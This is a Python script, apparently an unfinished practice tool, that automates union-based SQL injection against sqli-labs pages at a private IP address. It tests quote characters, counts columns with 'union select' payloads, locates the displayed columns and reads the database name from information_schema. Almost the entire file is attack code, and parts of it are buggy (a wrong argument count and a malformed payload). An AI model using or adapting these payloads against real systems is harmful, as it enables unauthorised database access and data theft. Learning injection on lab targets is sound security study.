import  requests
from lxml import etree
import re



#ORDER BY 判断列数用到的
def ORDER_BY_Grinning():
    # 其实可以用循环实现的，这个真的是不想思路了头大,我就这样写的简单明了了
    ORDER_BY_Grinning=["union%20 select 1 --+'","union%20 select 1,2--+'","union%20 select 1,2,3 --+'","union%20 select 1,2,3,4 --+'","union%20 select 1,2,3,4,5-+'","union%20 select 1,2,3,4,5,6 --+'"]
    return  ORDER_BY_Grinning


class judge_Numbers_or_characters():
    def __init__(self, url,test,Grinning):
        self.url=url
        self.test=test
        self.Grinning = Grinning
    def union(self):
        self.statement=(self.url[:-1] +"-1"+ self.test + self.Grinning)  # 拼接语句
        return  self.statement
    def union2(self):
        self.statement = (self.url[:-1] + "-1" + self.test + self.Grinning)

# ORDER BY 判断列数
def ORDER_BY(url,test):
    ORDER_BY_=ORDER_BY_Grinning()
    for Grinning in range(6):
        print((url[:-1]+'-1'+test+ORDER_BY_[Grinning]))
        html = requests.get(url[:-1]+'-1'+test+ORDER_BY_[Grinning])
        if html.text.find('SELECT') == -1:
            print("ORDER BY 判断列有:"+str(Grinning+1)+'个')
            Injection_statement_apostrophe(url, Grinning)

def Possible_test(url,test):
    # 判断是否是数字还是字符
    statement=url+test[0]+"%20--+%20"+test[0] # 拼接 语句 ' --+ '
    html = requests.get(statement) # 拼接后发起请求

    if html.text.find('SQL syntax') == -1:
        print("注入漏洞判断可能是字符号")  # 判断是否是字符'号注入

        print("很大可能是'符号")
        ORDER_BY(url,test[0])
    else:
        print("注入漏洞判断可能不是字符号")
        Injection_statement_number(url, test[2])

# 数字进行注入测
def Injection_statement_number(url,Grinning):
    ORDER_BY_ = ORDER_BY_Grinning()
    statement=judge_Numbers_or_characters(url,ORDER_BY_[Grinning])

    html = requests.get(statement.union())  # 拼接后发起请求
    if html.text.find('SQL syntax') == -1:
        html = etree.HTML(html.text)
        divs = html.xpath(r'//font/font/text()')  # 语法
        for i in range(int(Grinning)):
            Location=re.findall(str(i+1), (" ".join(divs)))

            Location1=0
            if len(Location) ==1:

                print("ORDER BY 判断列页面输出用到的列在"+str(Location[0])+'个')
    else:
        print("不对")


# '进行注入测试
def Injection_statement_apostrophe(url,Grinning):
    ORDER_BY_ = ORDER_BY_Grinning()
    statement=judge_Numbers_or_characters(url,"'",ORDER_BY_[Grinning])

    html = requests.get(statement.union())  # 拼接后发起请求
    if html.text.find('SQL syntax') == -1:
        html = etree.HTML(html.text)
        divs = html.xpath(r'//font/font/text()')  # 语法
        for i in range(int(Grinning)):
            Location=re.findall(str(i+1), (" ".join(divs)))

            Location1=0
            if len(Location) ==1:
                Injection_Read_information()
                print("ORDER BY 判断列页面输出用到的列在"+str(Location[0])+'个')
    else:
        print("不对")

def Injection_Read_information():
    html = requests.get('http://192.168.125.93/Less-1/?id=-1%27%20%20union%20select%201,(select%20schema_name%20from%20information_schema.schemata%20%20%20LIMIT%200,1),3%20--+')  # 拼接后发起请求
    html = etree.HTML(html.text)
    divs = html.xpath(r'//font/font/text()')  # 语法
    print("读取当前数据库名字:"+str(divs))
def enter():
    print("""
               _   _        _           _   _             
     ___  __ _| | (_)_ __  (_) ___  ___| |_(_) ___  _ __  
    / __|/ _` | | | | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
    \__ \ (_| | | | | | | || |  __/ (__| |_| | (_) | | | |
    |___/\__, |_| |_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
            |_|          |__/   
    
    *开发中。。。。
    """)
if __name__ == '__main__':
    enter()
    url='http://192.168.125.93/Less-2/?id=2'
    test = ['%27', '%22','']
    Possible_test(url,test)
